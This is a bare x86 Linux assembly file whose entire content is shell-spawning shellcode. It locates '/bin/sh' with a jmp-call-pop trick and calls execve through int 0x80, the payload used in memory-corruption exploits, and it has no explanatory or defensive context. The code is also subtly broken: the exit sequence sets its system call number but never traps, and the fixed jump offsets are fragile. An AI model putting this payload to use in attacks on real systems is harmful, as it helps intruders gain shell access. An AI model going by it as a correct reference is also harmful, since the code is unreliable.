
[SECTION .text]
global execve_do

execve_do:
    push ebp
    mov ebp, esp
    jmp short $+0x13
    pop dword esi           ; get the sh_str address in esi
    lea ebx, [esi]
    xor ecx, ecx
    xor edx, edx
    xor eax, eax
    mov al, 0x0b
    int 0x80
    xor ebx, ebx
    mov al, 0x01            ; call exit

sh_str:
    call execve_do + 5
    db '/bin/sh', 0
